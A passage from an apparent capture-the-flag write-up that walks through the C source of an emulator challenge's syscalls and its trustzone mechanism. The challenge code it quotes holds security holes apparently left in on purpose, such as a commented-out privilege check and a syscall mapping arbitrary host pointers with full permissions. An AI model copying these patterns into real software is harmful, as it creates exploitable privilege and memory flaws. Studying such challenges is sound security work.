</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;.&#39;</span> <span class="o">||</span> <span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;_&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to open trustzone %s %m</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">errno</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">off_t</span> <span class="n">size</span> <span class="o">=</span> <span class="nf">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_END</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">err</span> <span class="o">=</span> <span class="nf">uc_mem_map</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">size</span><span class="p">),</span><span class="n">UC_PROT_READ</span> <span class="o">|</span> <span class="n">UC_PROT_EXEC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed on uc_mem_map() with error %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">err</span> <span class="o">=</span> <span class="nf">uc_hook_add</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="o">&amp;</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">,</span><span class="n">UC_HOOK_MEM_READ</span><span class="p">,</span><span class="n">trusted_read</span><span class="p">,</span><span class="n">current</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">addr</span><span class="o">+</span><span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">size</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed on uc_hook_add() with error %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">uc_mem_unmap</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">size</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">file</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">file</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_mem_write</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">file</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">tz_size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&#34;Trustzone allocated at %p %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">size</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">destroy_trustzone</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_mem_unmap</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span><span class="p">,</span><span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">tz_size</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_hook_del</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">tz_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">confirm_password</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">password</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">password_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;password&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">password_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;open password failed: %m</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">abort</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="n">password_fd</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">password_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">user_password</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">password</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">e</span> <span class="o">=</span> <span class="nf">strncpy_user</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="n">user_password</span><span class="p">,</span><span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="k">sizeof</span><span class="p">(</span><span class="n">user_password</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">e</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">!!</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">user_password</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">user_password</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">trustzone_invoke</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone_mode</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_reg_read</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">ip_reg</span><span class="p">[</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">arch</span><span class="p">],</span><span class="o">&amp;</span><span class="n">ip</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">uc_emu_start</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span> <span class="o">+</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">tz_size</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone_mode</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&#34;trustzone over %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="nf">uc_strerror</span><span class="p">(</span><span class="n">err</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_reg_write</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">ip_reg</span><span class="p">[</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">arch</span><span class="p">],</span><span class="o">&amp;</span><span class="n">ip</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">syscalls</span><span class="p">[])(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">unicornel_exit</span><span class="p">,</span> <span class="c1">//0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">unicornel_write</span><span class="p">,</span> <span class="c1">//1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">print_integer</span><span class="p">,</span> <span class="c1">//2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">create_shared</span><span class="p">,</span> <span class="c1">//3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">validate_handle</span><span class="p">,</span> <span class="c1">//4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">map_address</span><span class="p">,</span> <span class="c1">//5
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">unicornel_pause</span><span class="p">,</span> <span class="c1">//6
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">unicornel_resume</span><span class="p">,</span> <span class="c1">//7
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">create_trustzone</span><span class="p">,</span> <span class="c1">//8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">destroy_trustzone</span><span class="p">,</span> <span class="c1">//9
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">trustzone_invoke</span><span class="p">,</span> <span class="c1">//10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">confirm_password</span><span class="p">,</span> <span class="c1">//11
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">memprot</span><span class="p">,</span> <span class="c1">//12
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To recap, basically it implements 13 syscalls that can be called in our emulated program. We won&rsquo;t deep dive into all syscalls, but let&rsquo;s examine some important ones after this.</p>
<p>First, we need to understand that the code implements a <code>trustzone</code> mechanism. The trustzone is a secure execution environment where certain privileged syscalls can only be executed. This is enforced by the <code>TRUSTED_SYSCALL</code> macro which checks if <code>trustzone_mode</code> is enabled before allowing the syscall to proceed.</p>
<p>The trustzone mechanism works by having a special execution mode controlled by the <code>trustzone_mode</code> flag. Programs can create a trustzone using the <code>create_trustzone</code> syscall which sets up a region of code that can be executed via <code>trustzone_invoke</code>. When <code>trustzone_invoke</code> is called, it temporarily sets <code>trustzone_mode</code> to true, executes the trustzone code, and then sets it back to false. While in trustzone mode, the program can execute privileged syscalls like <code>validate_handle</code>, <code>map_address</code>, <code>memprot</code>, etc, that are protected by the <code>TRUSTED_SYSCALL</code> macro. This provides a way to isolate sensitive operations and only allow them to be performed from within the trustzone context.</p>
<p>The trustzone code itself is protected from the normal emulated program in two ways. First, when the trustzone region is created, it is mapped with <code>r-x</code> (read-execute) permissions, preventing the normal program from writing to that memory area. Second, a hook is added to prevent the normal program from executing any instructions that could read the contents of the trustzone memory addresses directly. These two protections are intended to ensure that sensitive trustzone code cannot be tampered with or leaked by the unprivileged emulated program.</p>
<p>Now that we understand how the trustzone mechanism works at a high level, let&rsquo;s take a closer look at some of the key syscalls that implement this functionality. The syscalls array defines 13 different syscalls (numbered 0-12) that can be called from the emulated program. We&rsquo;ll focus on the ones most relevant to the trustzone implementation and memory management:</p>
<p><strong>create_shared</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">create_shared</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// TRUSTED_SYSCALL;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mh">0x10000</span> <span class="o">||</span> <span class="o">!</span><span class="n">length</span> <span class="o">||</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>            
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//Find an empty shared buffer handle
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">handle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">handle</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">handle</span> <span class="o">&lt;</span> <span class="n">MAX_PROCESSES</span><span class="p">;</span> <span class="n">handle</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">refs</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">handle</span> <span class="o">==</span> <span class="n">MAX_PROCESSES</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">buffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">refs</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">length</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">handle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This syscall allocates a new buffer and stores it in the <code>shared_buffers</code> array so it can be accessed by multiple processes. It returns a handle that other processes can use to reference this shared buffer.</p>
<p><strong>validate_handle</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">validate_handle</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">handle</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">handle</span> <span class="o">&gt;=</span> <span class="n">MAX_PROCESSES</span> <span class="o">||</span> <span class="o">!</span><span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">refs</span> <span class="o">||</span> <span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">length</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This syscall is used to validate a shared buffer handle and get its address. This syscall is protected by <code>TRUSTED_SYSCALL</code> to prevent unprivileged code from getting shared buffer addresses directly.</p>
<p><strong>map_address</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">map_address</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&#34;Mapping %p @ %p length %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">e</span> <span class="o">=</span> <span class="nf">uc_mem_map_ptr</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">length</span><span class="p">,</span><span class="n">UC_PROT_ALL</span><span class="p">,</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
